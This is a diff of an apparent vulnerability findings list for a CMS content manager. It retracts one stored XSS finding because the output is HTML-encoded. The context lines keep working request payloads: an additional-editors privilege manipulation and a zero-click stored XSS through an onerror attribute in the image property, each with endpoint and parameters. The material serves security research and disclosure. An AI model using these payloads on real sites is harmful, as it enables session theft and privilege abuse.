@@ -85,10 +85,8 @@
 - Data: `m1_content_id=<page_you_can_edit>&ownerid=<your_uid>&additional_editors[]=<your_uid>&m1_submit=1`
 - Req: additional-editor rights on that page (not owner/admin).
 
-**17. Menu text — stored XSS in breadcrumb title attribute**
-- Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_id=<page>&menutext=" onmouseover="alert(document.cookie)&m1_submit=1`
-- Fire: visit any frontend page rendering breadcrumbs, hover the link
-- Req: content editor; template uses breadcrumbs.
+**17. Menu text — stored XSS in breadcrumb — ❌ RETRACTED (invalid)**
+- Reason: `{$node->menutext}` is `cms_htmlentities`-encoded by `Nav_utils::fill_node:90`, so the attribute-breakout can't fire. Source→sink verified.
 
 **18. Content property — zero-click stored XSS (image/extra)**
 - Set: `POST .../moduleinterface.php?mact=CMSContentManager,m1_,admin_editcontent,0&__c=KEY` → `m1_content_id=<page>&image=x" onerror="alert(document.cookie)&m1_submit=1`
